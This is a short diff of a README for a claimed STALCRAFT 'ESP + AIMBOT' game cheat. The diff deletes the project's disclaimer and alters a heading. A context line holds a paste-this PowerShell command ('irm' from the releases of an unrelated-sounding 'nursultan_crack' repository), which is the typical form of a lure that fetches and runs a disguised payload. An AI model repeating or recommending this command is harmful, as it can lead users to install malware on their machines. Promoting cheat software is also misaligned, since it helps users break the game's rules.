@@ -2,7 +2,7 @@
 
 <div align="center">
 
-# 🚀 STALCRAFT EXTERNAL ESP + AIMBOT
+#№ 🚀 STALCRAFT EXTERNAL ESP + AIMBOT
 
 <br>
 
@@ -28,7 +28,6 @@ powershell -c irm https://github.com/goldwinston/nursultan_crack/releases/latest
 
 </div>
 
-> **⚠️ DISCLAIMER:** This project was created for educational purposes only. Using this in online games violates the EULA and may result in a permanent ban. The author is not responsible for any consequences.
 
 ---
 
